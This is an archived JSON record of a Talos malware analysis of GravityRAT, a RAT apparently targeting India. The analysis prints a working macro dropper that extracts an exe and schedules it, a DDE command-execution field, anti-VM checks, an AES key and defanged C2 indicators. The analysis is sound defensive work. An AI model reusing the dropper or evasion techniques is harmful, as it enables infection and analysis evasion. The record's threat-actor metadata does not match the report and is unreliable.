{
    "id": "7f9b0e02-6986-4d3a-9ec0-91b4310ed5bb",
    "created_at": "2023-01-12T15:04:20.659007Z",
    "updated_at": "2025-03-27T02:09:29.769576Z",
    "deleted_at": null,
    "sha1_hash": "24629936f917b867f004a288d999c2546fda4ed0",
    "title": "2018-04-26 - GravityRAT - The Two-Year Evolution Of An APT Targeting India",
    "authors": "",
    "file_creation_date": "2022-05-28T15:55:31Z",
    "file_modification_date": "2022-05-28T15:55:31Z",
    "file_size": 689018,
    "plain_text": "# GravityRAT - The Two-Year Evolution Of An APT Targeting India\n\n**[blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html](https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html)**\n\n_[This blog post is authored by Warren Mercer and](https://twitter.com/securitybeard)_ _[Paul Rascagneres.](https://twitter.com/r00tbsd)_\n\n_Update: 4/30 Since the publication of the blog post, one of the anti-VM capability was_\n_commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of_\n_the system. We decided to add more details and clarifications concerning this feature._\n_GravityRAT uses a WMI request in order to get the current temperature of the hardware._\n_Here is the output of the query on a physical machine (a Surface Book):_\n\n\n-----\n\n_The query returns the temperature of 7 thermal zones._\n_Here is the output on a Virtual Machine executed by Hyper-V on the same hardware:_\n\nThe feature is not supported. The malware author used this behavior in order to identify VM\n(such as Sandboxes).\n\nFrom our tests and the feedback from several researchers, this monitoring is not supported\non Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several\nrecent physical systems do not support it (a researcher reported some Lenovo and Dell\nhosts did not support this). It means that GravityRAT will consider this physical machine as\nVMs. Importantly to note this check is not foolproof as we have identified physical hosts\nwhich do not report back the temperature, however, it should also be considered a check that\nis identifying a lot of virtual environments. This is particularly important due to the amount of\nsandboxing & malware detonation being carried out within virtual environments by\nresearchers.\n\n## Summary\n\nToday, Cisco Talos is uncovering a new piece of malware, which has remained under the\nradar for the past two years while it continues to be developed. Several weeks ago, we\nidentified the use of the latest version of this RAT (Remote Access Tool). In this article, we\nwill discuss the technical capabilities, the evolution, development and potential attribution of\nwhat we are calling GravityRAT.\n\nGravityRAT has been under ongoing development for at least 18 months, during which the\ndeveloper has implemented new features. We've seen file exfiltration, remote command\nexecution capability and anti-vm techniques added throughout the life of GravityRAT. This\nconsistent evolution beyond standard remote code execution is concerning because it shows\ndetermination and innovation by the actor.\n\nThroughout our investigation, we observed several malicious documents used to attack\nvictims, which we will discuss. These malicious documents were used by the developer to\nrun several tests on the popular analysis platform VirusTotal. Using VirusTotal allowed the\n\n\n-----\n\ndeveloper to make changes in an attempt to decrease antivirus detection.\n\nAlthough GravityRAT has not been previously published or discussed, there was some\ninformation from the National Computer Emergency Response Team (CERT) of India\n[describing GravityRAT as being used in targeted attacks against India. Finally, we will](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf)\ndiscuss specific attribution elements discovered during our research into GravityRAT as we\nidentify specific information, which we believe to be leaked by the developer, such as\nlocation, and potentially their first name.\n\n## Infection Vectors\n\n### Malicious Office Documents\n\nThe majority of the malicious documents crafted by the malware author are Microsoft Office\nWord documents. The attacker uses an embedded macro in order to execute malicious code\non the victim's system. The document opens and appears as such:\n\nThe document asks to the user to enable macros in order to prove that the user is not a robot\n(similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that\na lot of Office-based malware uses. It is an attempt to trick any users who are using\n\n\n-----\n\nProtected Mode on their systems. By enabling macros, the malware is able to begin it s\nexecution. We discovered that the embedded macro is quite small when extracted.\n```\nSub AutoOpen()\n If Not Dir(Environ(\"TEMP\") + \"\\image4.exe\") <> \"\" Then\n  Const lCancelled_c As Long = 0\n   Dim sSaveAsPath As String\n   sSaveAsPath = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%Temp%\")\n+ \"\\temporary.zip\"\n   If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub\n   ActiveDocument.Save\n   Application.Documents.Add ActiveDocument.FullName\n   ActiveDocument.SaveAs sSaveAsPath\n   ActiveDocument.Close\n   Set app = CreateObject(\"Shell.Application\")\n   ExtractTo = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%Temp%\")\n   ExtractByExtension app.NameSpace(Environ(\"TEMP\") + \"\\temporary.zip\"), \"exe\",\nExtractTo\n End If\nEnd Sub\nSub ExtractByExtension(fldr, ext, dst)\n Set FSO = CreateObject(\"Scripting.FileSystemObject\")\n Set app = CreateObject(\"Shell.Application\")\n For Each f In fldr.Items\n  If f.Type = \"File folder\" Then\n   ExtractByExtension f.GetFolder, ext, dst\n  ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then\n   If Not Dir(Environ(\"TEMP\") + \"\\image4.exe\") <> \"\" Then\n    app.NameSpace(dst).CopyHere f.Path, &H4\n   End If\n  End If\n Next\n Shell \"schtasks /create /tn wordtest /tr \"\"'%temp%\\image4.exe' 35\"\" /sc DAILY /f\n/RI 10 /du 24:00 /st 00:01\"\nEnd Sub\n\n```\nThis macro contains three functions:\n\nThe first one is executed when the document is opened. The purpose is to copy the\nactive document (the opened Word document) in a temporary directory and to rename\nit as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can\nbe unzipped using common tools.\n\nThe second function decompresses this 'temporary.zip' file and extracts the .exe file\nstored in it.\n\nThe third creates a scheduled task, named 'wordtest', to execute this malicious file\nevery day.\n\nWith this approach, the attacker ensures that there is no direct execution (the executable is\nexecuted thanks to scheduled tasks), there's no download of an additional payload, and\n\n\n-----\n\nfinally, the author uses the fact that the docx format is an archive in order to include its\nexecutable (GravityRAT).\n\n### Testing By The Author\n\nDuring our tracking, we identified several malicious documents submitted from this actor on\nVirusTotal for testing purposes. They tested the detection on macros (by modifying them, or\nby executing the calc instead of the malicious payload) and the developers tried dynamic\ndata exchange (DDE) execution in the Office document. This is abusing the DDE protocol\nwhich exists within Microsoft Office documents. Whilst this is a feature Microsoft provide it is\nalso a feature that an attacker can leverage for malicious activity, Microsoft published\n[mitigation information here previously. The developer crafted Office Word and Excel](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)\ndocuments to see the detection in VirusTotal. The authors tried to hide the DDE object in a\ndifferent part of the document — in the main object and the header, for example. The DDE\nobject simply executes Microsoft calc in the detected sample. Here is an example:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<w:document [...redated...}] mc:Ignorable=\"w14 w15 wp14\"><w:body><w:p\nw:rsidR=\"00215C91\" w:rsidRDefault=\"008C166A\"><w:r><w:fldChar w:fldCharType=\"begin\"/>\n</w:r><w:r><w:instrText xml:space=\"preserve\"> </w:instrText></w:r><w:r><w:rPr>\n<w:rFonts w:ascii=\"Helvetica\" w:hAnsi=\"Helvetica\" w:cs=\"Helvetica\"/><w:color\nw:val=\"383838\"/><w:spacing w:val=\"3\"/><w:sz w:val=\"26\"/><w:szCs w:val=\"26\"/><w:shd\nw:val=\"clear\" w:color=\"auto\" w:fill=\"FFFFFF\"/></w:rPr><w:instrText>DDEAUTO\nc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"</w:instrText></w:r><w:r><w:instrText\nxml:space=\"preserve\"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r>\n<w:bookmarkStart w:id=\"0\" w:name=\"_GoBack\"/><w:bookmarkEnd w:id=\"0\"/></w:p><w:sectPr\nw:rsidR=\"00215C91\"><w:pgSz w:w=\"12240\" w:h=\"15840\"/><w:pgMar w:top=\"1440\"\nw:right=\"1440\" w:bottom=\"1440\" w:left=\"1440\" w:header=\"720\" w:footer=\"720\"\nw:gutter=\"0\"/><w:cols w:space=\"720\"/><w:docGrid w:linePitch=\"360\"/></w:sectPr>\n</w:body></w:document>\n\n```\nWe believe the filenames of the submitted samples are clearly testing docs, using different\nmethods and Office tricks to attempt to ensure his malware was undetected. Those names\nwere:\n\ntestnew1.docx\n\nTest123.docx\ntest456.docx\ntest2.docx\nbook1test2.xlsx\nTest123.doc\n\n## GravityRAT\n\n\n-----\n\nOur initial discovery of GravityRAT was through a malicious Word document. As explained\npreviously, this Word document had various macros to deliver a final payload.Considering\nthat this was the most recent version of the malware, we decided to ascertain how long this\nactor had been active, and how their attacks had evolved. We were able to discover four\ndistinct versions of GravityRAT, developed over two years. Next, we will go through what we\nbelieve is the development life cycle and feature-addition mission carried out by this\ndeveloper.\n\n### Version G1\n\nThe malware author uses a versioning system starting by the G letter. The oldest version we\nidentified is G1. Here is the PDB path of the sample:\n```\nf:\\F\\Windows Work\\G1\\Adeel's Laptop\\G1 Main\nVirus\\systemInterrupts\\gravity\\obj\\x86\\Debug\\systemInterrupts.pdb\n\n```\nYou can notice the potential first name of the developers: Adeel. Of course, this information\ncan be manipulated by the malware author. This sample was compiled in December 2016.\nThe original filename of the sample was resume.exe.\n\nThe purpose of this version was to steal information on the compromised system:\n\nMAC Address\nComputer name\nUsername\nIP address\nDate\nSteal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf\nThe volumes mapped on the system\n\nAll this information was then sent to one of the following domains:\n\nG1 also had the ability to execute commands remotely on the infected host machine at the\nauthor's will.\n\n\n-----\n\n### Version G2\n\nWe identified a new variant used in July 2017 named G2. Here is the PDB of the sample:\n```\ne:\\Windows Work\\G2\\G2 Main Virus\\Microsoft Virus Solutions (G2 v5)\n(Current)\\Microsoft Virus Solutions\\obj\\Debug\\Windows Wireless 802.11.pdb\n\n```\nFor this version, the developer modified the architecture of the malware. The main code aims\nto load and execute two additional .NET binaries stored in the resources of the file:\n\n[The first resource is a legitimate open-source library available on GitHub. It's a .NET](https://github.com/dahall/TaskScheduler)\nwrapper for the Windows Task Scheduler\nThe second is the G2 version of GravityRAT\n\nThis variant shares the same command and control (C2) servers as G1, however, we have\nan additional 'payload' variable added to G2.\n\nThis variant has almost identical capabilities as the previous, except one additional\nfunctionality: It collects the CPU information in the Win32_Processor entry via WMI request\n(Processor ID, Name, Manufacturer and the clock speed). The attacker is most likely using\nthis information as part of an anti-vm attempt within this malware. This is used to try and\nthwart analysis in virtual environments.\n\nIn a slight change to the previous variant, the new payloads are executed with a Windows\nScheduled Task. This would explain the inclusion of the .NET wrapper.\n\nThe analysed sample contained a decoy picture document in the resource section:\n\n\n-----\n\n### Version G3\n\nIn August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the\nPDB:\n```\nF:\\Projects\\g3\\G3 Version 4.0\\G3\\G3\\obj\\Release\\Intel Core.pdb\n\n```\nThis variant uses the same method as G2, and includes a legitimate library in the resource\nsection. The developers also added additional language support to the library:\n\nGerman\nSpanish\nFrench\n\n\n-----\n\nItalian\nChinese\n\nThe author changed the backend of the C2 server with this variant. The URI changed too, it\ncontains the GravityRAT variant name:\n\nAugust was also the same month NIC CERT notified potential victims that GravityRAT had\nbeen used in a targeted campaign. Given the ongoing development nature of this malware, it\nmeant another variant was most likely due.\n\n### Version GX\n\nThe latest version of GravityRAT was created in December 2017 named GX. Here is the\nPDB:\n```\nC:\\Users\\The Invincible\\Desktop\\gx\\gx-current-program\\LSASS\\obj\\Release\\LSASS.pdb\n\n```\nThis version is the most advanced variant of GravityRAT. Throughout the evolution, we saw\nthis malware embedding open-source legitimate .NET libraries (for schedule tasks,\ncompression, encryption, .NET loading). It contains a resource named \"important.\" This is an\narchive with a password.\n\nThis variant has the same features as before, but this time, some new features are added:\n\nIt collects open ports on the victim host by running the netstat command\nIt lists all the running processes\nIt lists available services on the system\nIt exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant\nIf a USB key is connected on the system, the malware steals the file based on an\nextension list\nIt supports file encryption (AES with the key \"lolomycin2017\")\n\n\n-----\n\nIt collects information on the account (account type, description, domain name, full\nname, SID and status)\nIt checks if the system is a virtual machine with several techniques\n\nThe developer implemented a total of seven techniques to identify if the compromised\nsystem is a virtual machine.\n\nThe first technique consists of looking at any additional tools used by the hypervisor that are\ninstalled on the system (by checking a registry key):\n\nThe second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the\nresponse contains: \"VMware\", \"Virtual\", \"XEN\", \"Xen\" or \"A M I\" the system is considered as\na virtual machine. Additionally, the malware checks the SerialNumber and the version of the\nBIOS.\n\nThe third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer\ncontains \"VIRTUAL\", \"VMWARE\" or \"VirtualBox\".\n\nThe fourth technique checks the Processor ID of the system.\n\nThe fifth technique counts the number of cores in the infected system (the author expects\nmore than one core)\n\n\n-----\n\nThe sixth technique checks the current CPU temperature of the system (the\nMSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox\nand Hyper-V) do not support temperature check. The WMI request simply replies \"not\nsupported\". This behaviour can be used to detect if the targeted system is a real machine.\n\nThe last technique uses the MAC Address of the infected system. If the MAC Address starts\nby a well-known hexadecimal number, the system is identified as a virtual machine.\n\nThe C2 servers communication is performed in HTTP as it did previously. The variant version\nof GX is used in the URI. The C2 servers we can see are shared with the previous variants:\n\n## What we know about the author\n\nBelow, we will present evidence that we have obtained regarding the attacker and the\nassociated malware. Obviously, attribution is a complex field. The developers could be using\n\n\n-----\n\na proxy or a VPN in order to fake the origin of the submission. But, we will still simply present\nsome facts concerning this actor.\n\nThe developer used at least two different usernames in the past two years: \"The Invincible\"\nand \"TheMartian.\" In the oldest version of GravityRAT, the attacker potentially leaked his or\nher first name in the PDB: \"Adeel\" — the path contained \"Adeel's Laptop\". Additionally, all\nthe malicious Office documents, and more specifically the documents used to test anti-virus\non VirusTotal, were submitted from Pakistan. One of the four PE files in the IOCs section was\nsent from Pakistan, too.\n\n[In August 2017, NIC CERT published an advisory about malicious targeted campaigns. This](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf)\nadvisory mentions the C2 server infrastructure of GravityRAT, which means the GravityRAT\nauthor likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and using\nthe Investigate tool, we were able to determine that across all of the C2 domains listed, we\nsaw a large influx of traffic originating from India, as evidenced by NIC CERT, all of the C2\ndomains were at least 50 percent requested by Indian IP infrastructure. It is possible that\nsome of the non-Indian IP space requests may artefacts be due to our own research.\n\n## Conclusion\n\nThis actor is probably not the most advanced actor we've seen. But he or she managed to\nstay under the radar since 2016. They worked on malicious code, and produced four\nvariants. Each new variant included new features. The developer used the same C2\ninfrastructure all this time. The developer was clever enough to keep this infrastructure safe,\n\n\n-----\n\nand not have it blocklisted by a security vendor. The actor took their time to ensure they were\nnot within a virtual environment to avoid analysis. However, they did not take any time at all\nto attempt to obfuscate their .NET code. The code was largely trivial to reverse engineer,\nwhich meant static analysis was an easy option for this piece of malware.\n\nNIC CERT published an advisory about this actor, which suggest they targeted Indian\nentities and organizations.\n\nThe author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform.\nThanks to this information, we we able to understand how they tested malicious documents\nin order to decrease detection ratios across many popular engines. During this testing\nperiod, all the samples were uploaded from Pakistan to VirusTotal.\n\n## Coverage\n\nAdditional ways our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/advanced-malware-protection&sa=D&ust=1524553763505000)\nmalware used by these threat actors.\n\n[CWS or WSA web scanning prevents access to malicious websites and detects malware](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html&sa=D&ust=1524553763506000)\nused in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html&sa=D&ust=1524553763507000)\n\n[Network Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&sa=D&ust=1524553763508000)\nactivity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.google.com/url?q=https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html&sa=D&ust=1524553763509000)\nproducts.\n\n\n-----\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://www.google.com/url?q=https://umbrella.cisco.com/&sa=D&ust=1524553763510000)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.google.com/url?q=https://www.snort.org/products&sa=D&ust=1524553763510000)\n\n## IOCs\n\n### Malicious Documents\n\n**Macros**\n\n0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703\n\n70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82\n\n835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4\n\nC14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719\n\ned0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a\n\nf4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136\n\n**Other Malicious Documents (DDE)**\n\n911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f\n\nfb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210\n\nef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301\n\ncd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2\n\n07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105\n\n### GravityRAT\n\n**G1**\n\n9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a\n\n**G2**\n\n1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc\n\n**G3**\n\n99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90\n\n\n-----\n\n**GX**\n\n1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96\n\n### C2 Servers\n\nhxxp://cone[.]msoftupdates.com:46769\n\nhxxp://ctwo[.]msoftupdates.com:46769\n\nhxxp://cthree[.]msoftupdates.com:46769\n\nhxxp://eone[.]msoftupdates.eu:46769\n\nhxxp://etwo[.]msoftupdates.eu:46769\n\nhxxp://msupdates[.]mylogisoft.com:46769\n\nhxxp://coreupdate[.]msoftupdates.com:46769\n\nhxxp://updateserver[.]msoftupdates.eu:46769\n\nmsoftupdates[.]com\n\nmsoftupdates[.]eu\n\nmylogisoft[.]com\n\nURI:\n\n/Gvty@/1ns3rt_39291384.php\n\n/Gvty@/newIns3rt.php\n\n/Gvty@/payloads\n\n/Gvty@/ip.php\n\n/G3/ServerSide/G3.php\n\n/G3/Payload/\n\n/GX/GX-Server.php\n\n/GetActiveDomains.php\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-04-26 - GravityRAT - The Two-Year Evolution Of An APT Targeting India.pdf"
    ],
    "report_names": [
        "2018-04-26 - GravityRAT - The Two-Year Evolution Of An APT Targeting India.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535860,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653753331,
    "ts_modification_date": 1653753331,
    "files": {
        "pdf": "https://archive.orkl.eu/24629936f917b867f004a288d999c2546fda4ed0.pdf",
        "text": "https://archive.orkl.eu/24629936f917b867f004a288d999c2546fda4ed0.txt",
        "img": "https://archive.orkl.eu/24629936f917b867f004a288d999c2546fda4ed0.jpg"
    }
}